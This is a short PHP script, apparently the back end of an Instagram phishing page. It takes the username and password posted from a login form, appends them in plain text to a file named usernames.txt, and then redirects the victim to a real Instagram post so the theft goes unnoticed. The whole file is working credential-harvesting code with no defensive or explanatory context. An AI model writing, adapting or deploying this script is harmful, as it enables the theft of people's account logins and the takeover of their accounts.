<?php

file_put_contents("usernames.txt", "Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://www.instagram.com/p/CFo9mTChhWyHNfojna6r2gARv8EabBRFpq92z00/');
exit();
